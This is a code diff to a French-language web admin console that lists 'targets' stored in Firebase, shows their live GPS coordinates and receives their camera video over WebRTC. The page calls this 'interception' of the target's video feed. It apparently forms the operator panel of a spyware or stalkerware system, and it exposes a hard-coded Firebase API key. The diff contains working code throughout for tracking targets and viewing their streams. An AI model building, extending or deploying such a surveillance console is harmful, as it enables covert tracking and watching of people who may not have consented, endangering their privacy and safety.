@@ -3,69 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Console Admin - Surveillance Live</title>
+    <title>Console Admin - WebRTC Receiver</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-        }
+        body { font-family: 'Inter', sans-serif; }
         @keyframes pulse-red {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.4; }
         }
-        .live-pulse {
-            animation: pulse-red 1s infinite;
-        }
+        .live-pulse { animation: pulse-red 1s infinite; }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-8">
 
     <div class="max-w-6xl mx-auto space-y-6">
         
-        <!-- Header banner -->
+        <!-- En-tête de la Console -->
         <div class="flex flex-col md:flex-row md:items-center justify-between p-6 bg-slate-900 border border-slate-800 rounded-3xl shadow-xl gap-4">
             <div>
                 <h1 class="text-2xl md:text-3xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent flex items-center gap-2">
-                    <span>🎥</span> Console de Surveillance Live
+                    <span>🎥</span> Console de Surveillance WebRTC
                 </h1>
-                <p class="text-slate-400 text-sm mt-1">Réception directe du flux d'images et données GPS</p>
+                <p class="text-slate-400 text-sm mt-1">Interception directe et fluide du flux vidéo de la cible</p>
             </div>
             <div id="connectionStatus" class="px-4 py-2 bg-slate-950 border border-slate-800 rounded-2xl text-xs font-semibold text-slate-400 flex items-center gap-2">
                 <span class="w-2.5 h-2.5 rounded-full bg-slate-600" id="statusDot"></span>
-                <span id="statusText">Système en attente</span>
+                <span id="statusText">En attente de connexion</span>
             </div>
         </div>
 
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
             
             <div class="space-y-6 lg:col-span-1">
-                <!-- Advanced Targeted User Selector -->
+                <!-- Sélecteur de Cibles Actives -->
                 <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl">
-                    <h2 class="text-sm font-semibold text-slate-400 mb-4 uppercase tracking-wider">👤 Appareils Détectés</h2>
+                    <h2 class="text-sm font-semibold text-slate-400 mb-4 uppercase tracking-wider">👤 Cibles Détectées</h2>
                     <div class="space-y-4">
                         <div>
-                            <label class="block text-xs text-slate-500 mb-2">Choisir une cible :</label>
-                            <select id="userSelect" class="w-full bg-slate-950 text-slate-300 border border-slate-800 rounded-xl p-3 text-sm focus:outline-none focus:border-indigo-500 transition-all font-medium">
-                                <option value="">-- Attente d'utilisateurs --</option>
+                            <label class="block text-xs text-slate-500 mb-2 font-semibold">Choisir un émetteur actif :</label>
+                            <select id="userSelect" class="w-full bg-slate-950 text-slate-300 border border-slate-800 rounded-xl p-3 text-sm focus:outline-none focus:border-indigo-500 transition-all font-medium font-mono">
+                                <option value="">-- Attente de cibles --</option>
                             </select>
                         </div>
                     </div>
                 </div>
 
-                <!-- GPS Location Information panel -->
+                <!-- Panneau GPS en temps réel -->
                 <div id="userInfo" class="hidden bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl space-y-4">
                     <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📍 Coordonnées GPS</h3>
                     <div id="gpsData" class="space-y-3 text-sm">
-                        <!-- Filled dynamically by JavaScript -->
+                        <!-- Rempli par Firebase -->
                     </div>
                 </div>
 
-                <!-- Terminal activity logs console -->
+                <!-- Logs de Connexion -->
                 <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex flex-col h-64">
-                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs système</h3>
+                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs de Connexion WebRTC</h3>
                     <div id="connectionLog" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] font-mono text-cyan-400 overflow-y-auto space-y-1">
-                        <!-- Filled dynamically by JavaScript -->
+                        <!-- Rempli par JS -->
                     </div>
                 </div>
             </div>
@@ -73,24 +69,22 @@
             <div class="lg:col-span-2 space-y-4">
                 <div class="bg-slate-900 border border-slate-800 rounded-3xl p-4 shadow-xl flex flex-col">
                     <div class="flex items-center justify-between mb-3 px-2">
-                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Flux d'images</span>
+                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Flux Caméra Temps Réel</span>
                         <div class="flex items-center gap-3 text-xs text-slate-500">
-                            <span id="metaRes">-- px</span>
-                            <span class="text-slate-700">|</span>
-                            <span id="metaLatency">-- ms (latence)</span>
+                            <span id="metaState">Inactif</span>
                         </div>
                     </div>
 
-                    <!-- Photo Canvas Frame viewport -->
+                    <!-- Lecteur Vidéo WebRTC -->
                     <div class="relative bg-slate-950 aspect-video rounded-2xl overflow-hidden border border-slate-850 flex items-center justify-center min-h-[350px]">
                         <div id="placeholderText" class="absolute flex flex-col items-center justify-center text-slate-600 p-6 text-center">
                             <span class="text-5xl mb-3">📡</span>
-                            <p class="text-sm font-medium">Sélectionnez un utilisateur actif à gauche puis cliquez sur "Se connecter"</p>
+                            <p class="text-sm font-medium">Sélectionnez un appareil en ligne à gauche, puis cliquez sur "Se connecter".</p>
                         </div>
-                        <img id="remoteImage" alt="Flux Live" class="hidden w-full h-full object-contain">
+                        <video id="remoteVideo" autoplay playsinline class="hidden w-full h-full object-contain"></video>
                     </div>
 
-                    <!-- Interactive control elements -->
+                    <!-- Commandes administratives -->
                     <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
                         <button id="connectBtn" class="py-3 px-4 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
                             🔗 Se connecter
@@ -102,7 +96,7 @@
                             🖥️ Plein écran
                         </button>
                         <button id="debugBtn" class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all col-span-1">
-                            🐛 Infos Flux
+                            🐛 Debug Vidéo
                         </button>
                     </div>
                 </div>
@@ -112,7 +106,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+        import { getDatabase, ref, onValue, off, set, push, get, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
@@ -129,11 +123,12 @@
         const database = getDatabase(app);
 
         let currentUserId = null;
-        let frameListenerRef = null;
+        let peerConnection = null;
         let locationListenerRef = null;
-        let frameCount = 0;
+        let candidatesListenerRef = null;
+        let candidateQueue = [];
 
-        const remoteImage = document.getElementById('remoteImage');
+        const remoteVideo = document.getElementById('remoteVideo');
         const placeholderText = document.getElementById('placeholderText');
         const connectBtn = document.getElementById('connectBtn');
         const disconnectBtn = document.getElementById('disconnectBtn');
@@ -146,8 +141,15 @@
 
         const statusDot = document.getElementById('statusDot');
         const statusText = document.getElementById('statusText');
-        const metaRes = document.getElementById('metaRes');
-        const metaLatency = document.getElementById('metaLatency');
+        const metaState = document.getElementById('metaState');
+
+        const rtcConfig = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' },
+                { urls: 'stun:stun2.l.google.com:19302' }
+            ]
+        };
 
         function addLog(message) {
             const time = new Date().toLocaleTimeString();
@@ -167,6 +169,7 @@
             }
         }
 
+        // Système intelligent de catégorisation en direct et hors ligne
         function loadUsers() {
             const usersRef = ref(database, 'users');
             onValue(usersRef, (snapshot) => {
@@ -174,7 +177,6 @@
                 const previousSelection = userSelect.value;
                 const now = Date.now();
                 
-                // Keep track of categorized lists
                 const activeLive = [];
                 const activeIdle = [];
                 const offline = [];
@@ -182,12 +184,8 @@
                 if (users) {
                     Object.keys(users).forEach(userId => {
                         const userObj = users[userId];
-                        
-                        // Fallback check to support legacy structures or simple boolean values
                         const lastActiveTime = userObj.lastActive || userObj.timestamp || 0;
                         const userDevice = userObj.device || "📱 Appareil";
-                        
-                        // Verification threshold: if user hasn't synced in 8 seconds, they are offline
                         const isConnected = (now - lastActiveTime) < 8000;
                         
                         if (!isConnected) {
@@ -202,9 +200,8 @@
 
                 let selectHTML = '<option value="">-- Choisir une cible --</option>';
 
-                // 1. Group: Active Live Users (🟢)
                 if (activeLive.length > 0) {
-                    selectHTML += `<optgroup label="🟢 EN DIRECT (DIFFUSEUR ACTIF)">`;
+                    selectHTML += `<optgroup label="🟢 EN DIRECT (PARTAGE WEBRTC ACTIF)">`;
                     activeLive.forEach(user => {
                         const isSelected = (user.id === previousSelection) ? 'selected' : '';
                         selectHTML += `<option value="${user.id}" ${isSelected}>🟢 [LIVE] Cible #${user.id} (${user.device})</option>`;
@@ -212,7 +209,6 @@
                     selectHTML += `</optgroup>`;
                 }
 
-                // 2. Group: Connected Idle Users (🟡)
                 if (activeIdle.length > 0) {
                     selectHTML += `<optgroup label="🟡 EN LIGNE (ATTENTE)">`;
                     activeIdle.forEach(user => {
@@ -222,13 +218,12 @@
                     selectHTML += `</optgroup>`;
                 }
 
-                // 3. Group: Offline Users (⚫)
                 if (offline.length > 0) {
                     selectHTML += `<optgroup label="⚫ HORS LIGNE (INACTIF)">`;
                     offline.forEach(user => {
                         const isSelected = (user.id === previousSelection) ? 'selected' : '';
                         const timeString = user.lastSeen ? new Date(user.lastSeen).toLocaleTimeString() : 'Inconnue';
-                        selectHTML += `<option value="${user.id}" ${isSelected} class="text-slate-500">⚫ [HORS LIGNE] Cible #${user.id} (Dernier contact : ${timeString})</option>`;
+                        selectHTML += `<option value="${user.id}" ${isSelected}>⚫ [INACTIF] Cible #${user.id} (Dernier contact : ${timeString})</option>`;
                     });
                     selectHTML += `</optgroup>`;
                 }
@@ -242,9 +237,8 @@
         }
 
         function loadUserInfo(userId) {
-            if (locationListenerRef) {
-                off(locationListenerRef);
-            }
+            if (locationListenerRef) off(locationListenerRef);
+
             locationListenerRef = ref(database, `users/${userId}/location`);
             onValue(locationListenerRef, (snapshot) => {
                 const location = snapshot.val();
@@ -275,7 +269,8 @@
             });
         }
 
-        function connectToUser() {
+        // Connexion WebRTC : Prise d'offre, envoi de réponse, synchronisation ICE Candidates
+        async function connectToUser() {
             currentUserId = userSelect.value;
             if (!currentUserId) {
                 setSystemStatus("⚠️ Choisissez une cible", "pending");
@@ -289,51 +284,121 @@
             setSystemStatus("🔄 Connexion...", "pending");
             connectBtn.disabled = true;
             disconnectBtn.disabled = false;
-            fullscreenBtn.disabled = false;
             
-            addLog(`🔍 Demande du flux pour l'utilisateur #${currentUserId}...`);
-            
-            frameListenerRef = ref(database, `live/${currentUserId}/frame`);
-            frameCount = 0;
+            addLog(`🔍 Demande du flux WebRTC pour la cible #${currentUserId}...`);
 
-            onValue(frameListenerRef, (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.image) {
-                    placeholderText.style.display = 'none';
-                    remoteImage.src = data.image; 
-                    remoteImage.style.display = 'block';
-                    frameCount++;
+            try {
+                // Étape 1 : Récupérer l'offre SDP de l'utilisateur
+                const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
+                const offerSnapshot = await get(offerRef);
+                const offer = offerSnapshot.val();
 
-                    const latency = Date.now() - data.timestamp;
-                    metaLatency.innerText = `${latency} ms`;
-                    metaRes.innerText = `${remoteImage.naturalWidth || '--'} x ${remoteImage.naturalHeight || '--'} px`;
-
-                    if (frameCount === 1) {
-                        setSystemStatus("🔴 EN DIRECT", "live");
-                        addLog("✅ Flux d'images reçu et stabilisé !");
-                    }
-                } else {
-                    addLog("⚠️ En attente du démarrage de la caméra côté utilisateur...");
+                if (!offer) {
+                    addLog("❌ Impossible de se connecter : Aucune offre WebRTC disponible. La cible doit activer la diffusion.");
+                    setSystemStatus("❌ Aucun signal", "idle");
+                    connectBtn.disabled = false;
+                    disconnectBtn.disabled = true;
+                    return;
                 }
-            }, (error) => {
-                addLog(`❌ Erreur Firebase: ${error.message}`);
-            });
 
-            loadUserInfo(currentUserId);
+                // Étape 2 : Créer le PeerConnection local
+                peerConnection = new RTCPeerConnection(rtcConfig);
+                candidateQueue = [];
+
+                peerConnection.onconnectionstatechange = () => {
+                    metaState.innerText = peerConnection.connectionState.toUpperCase();
+                    addLog(`Statut de liaison : ${peerConnection.connectionState}`);
+                    if (peerConnection.connectionState === 'connected') {
+                        setSystemStatus("🔴 EN DIRECT", "live");
+                        fullscreenBtn.disabled = false;
+                    }
+                };
+
+                // Capture du flux vidéo entrant
+                peerConnection.ontrack = (event) => {
+                    addLog("🎬 Flux vidéo reçu ! Liaison avec le lecteur vidéo.");
+                    placeholderText.style.display = 'none';
+                    remoteVideo.style.display = 'block';
+                    remoteVideo.srcObject = event.streams[0];
+                };
+
+                // Envoi des ICE Candidates de l'admin à l'utilisateur
+                peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
+                        push(candidateRef, event.candidate.toJSON());
+                    }
+                };
+
+                // Définition de la description distante (l'offre de l'utilisateur)
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                addLog("📝 Offre de la cible appliquée avec succès.");
+
+                // Traitement de la file d'attente d'ICE Candidates distants
+                while (candidateQueue.length > 0) {
+                    const candidate = candidateQueue.shift();
+                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                }
+
+                // Étape 3 : Création et envoi de la réponse SDP (Answer)
+                const answer = await peerConnection.createAnswer();
+                await peerConnection.setLocalDescription(answer);
+
+                const answerRef = ref(database, `webrtc/${currentUserId}/answer`);
+                await set(answerRef, {
+                    sdp: answer.sdp,
+                    type: answer.type,
+                    timestamp: Date.now()
+                });
+                addLog("📤 Réponse de l'admin transmise.");
+
+                // Étape 4 : Écouter en temps réel les candidats de l'utilisateur
+                const userCandidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
+                candidatesListenerRef = onValue(userCandidatesRef, (snapshot) => {
+                    const candidates = snapshot.val();
+                    if (candidates) {
+                        Object.values(candidates).forEach(candidate => {
+                            if (peerConnection && peerConnection.currentRemoteDescription) {
+                                peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                            } else {
+                                candidateQueue.push(candidate);
+                            }
+                        });
+                    }
+                });
+
+                loadUserInfo(currentUserId);
+
+            } catch (err) {
+                addLog(`❌ Échec de la connexion WebRTC : ${err.message}`);
+                setSystemStatus("❌ Échec", "idle");
+                disconnect();
+            }
         }
 
         function disconnect() {
-            if (frameListenerRef) {
-                off(frameListenerRef);
-                frameListenerRef = null;
+            if (candidatesListenerRef) {
+                off(ref(database, `webrtc/${currentUserId}/candidates`));
+                candidatesListenerRef = null;
             }
             if (locationListenerRef) {
                 off(locationListenerRef);
                 locationListenerRef = null;
             }
             
-            remoteImage.src = "";
-            remoteImage.style.display = 'none';
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+
+            if (currentUserId) {
+                // On nettoie la réponse admin
+                remove(ref(database, `webrtc/${currentUserId}/answer`));
+                remove(ref(database, `webrtc/${currentUserId}/admin-candidates`));
+            }
+
+            remoteVideo.srcObject = null;
+            remoteVideo.style.display = 'none';
             placeholderText.style.display = 'flex';
             userInfoDiv.style.display = 'none';
             
@@ -341,17 +406,14 @@
             disconnectBtn.disabled = true;
             fullscreenBtn.disabled = true;
             
-            metaRes.innerText = "-- px";
-            metaLatency.innerText = "-- ms";
-            frameCount = 0;
-            
+            metaState.innerText = "INACTIF";
             setSystemStatus("🔌 Déconnecté", "idle");
             addLog("🔌 Déconnecté");
         }
 
         function toggleFullscreen() {
             if (!document.fullscreenElement) {
-                remoteImage.requestFullscreen().catch(err => {
+                remoteVideo.requestFullscreen().catch(err => {
                     console.error("Erreur plein écran:", err);
                 });
             } else {
@@ -365,14 +427,14 @@
         userSelect.addEventListener('change', disconnect);
         
         debugBtn.addEventListener('click', () => {
-            if (remoteImage.src) {
-                addLog(`ℹ️ [DEBUG] Image active: ${remoteImage.naturalWidth}x${remoteImage.naturalHeight}px. Nb images reçues: ${frameCount}`);
+            if (remoteVideo.srcObject) {
+                const stream = remoteVideo.srcObject;
+                addLog(`ℹ️ [DEBUG] Vidéo WebRTC active. Stream ID: ${stream.id}. Pistes : ${stream.getVideoTracks().length}`);
             } else {
                 addLog(`⚠️ [DEBUG] Aucun flux actif.`);
             }
         });
 
-        // Initialize target scanning on start
         loadUsers();
     </script>
 </body>
